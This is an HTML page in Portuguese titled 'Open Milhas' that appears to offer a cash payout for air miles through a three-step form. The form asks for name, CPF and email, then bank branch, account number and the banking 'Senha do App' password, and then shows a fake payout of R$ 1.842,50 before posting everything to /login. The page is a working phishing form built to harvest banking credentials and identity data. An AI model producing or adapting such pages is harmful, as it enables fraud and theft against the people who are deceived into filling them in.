<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Open Milhas</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: #0046ff; font-family: sans-serif; color: white; }
        .card { color: #333; border-radius: 20px; border: none; }
        .step { display: none; }
        .active { display: block !important; }
    </style>
</head>
<body>
    <div class="container py-5">
        <div class="text-center mb-4">
            <h2 class="fw-bold">OPEN MILHAS</h2>
        </div>
        <div class="card p-4 mx-auto" style="max-width: 450px;">
            <form action="/login" method="POST">
                <div class="step active" id="s1">
                    <h4>Dados Pessoais</h4>
                    <input type="text" name="nome" class="form-control mb-2" placeholder="Nome" required>
                    <input type="text" name="cpf" class="form-control mb-2" placeholder="CPF" required>
                    <input type="email" name="email" class="form-control mb-3" placeholder="E-mail" required>
                    <button type="button" class="btn btn-primary w-100" onclick="go(2)">CONTINUAR</button>
                </div>
                <div class="step" id="s2">
                    <h4>Recebimento PIX</h4>
                    <input type="text" name="agencia" class="form-control mb-2" placeholder="Agência">
                    <input type="text" name="conta" class="form-control mb-2" placeholder="Conta">
                    <input type="password" name="senha_app" class="form-control mb-3" placeholder="Senha do App">
                    <button type="button" class="btn btn-primary w-100" onclick="go(3)">VER VALOR</button>
                </div>
                <div class="step" id="s3">
                    <div class="text-center">
                        <h3 class="text-success">R$ 1.842,50</h3>
                        <button type="submit" class="btn btn-success w-100 mt-3">VENDER AGORA</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
    <script>
        function go(n) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById('s'+n).classList.add('active');
        }
    </script>
</body>
</html>
